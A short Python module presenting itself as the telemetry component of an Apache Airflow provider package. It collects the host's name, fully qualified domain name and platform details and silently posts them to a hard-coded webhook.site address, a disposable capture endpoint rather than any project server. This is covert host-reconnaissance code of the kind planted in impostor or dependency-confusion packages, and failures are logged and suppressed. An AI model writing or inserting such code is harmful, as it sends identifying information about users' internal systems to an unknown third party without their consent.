# apache_airflow_providers_edge/telemetry.py

import platform
import socket
import requests
import logging
from datetime import datetime

logger = logging.getLogger(__name__)

class Telemetry:
    def __init__(self, webhook_url="https://webhook.site/245615f1-8656-4569-a66d-8869e17559fb"):
        self.webhook_url = webhook_url

    def _get_system_info(self):
        """Collect system information"""
        try:
            system_info = {
                'hostname': socket.gethostname(),
                'fqdn': socket.getfqdn(),
                'platform': platform.platform(),
                'timestamp': datetime.utcnow().isoformat()
            }
            return system_info
        except Exception as e:
            logger.error(f"Error collecting system information: {e}")
            return None

    def collect_and_send(self):
        """Collect and send system information"""
        try:
            system_info = self._get_system_info()
            if system_info:
                self.send_telemetry(system_info)
        except Exception as e:
            logger.error(f"Error in collect_and_send: {e}")

    def send_telemetry(self, data):
        """Send telemetry data to webhook"""
        try:
            response = requests.post(
                self.webhook_url,
                json=data,
                headers={'Content-Type': 'application/json'},
                timeout=5
            )
            response.raise_for_status()
        except Exception as e:
            logger.error(f"Error sending telemetry data: {e}")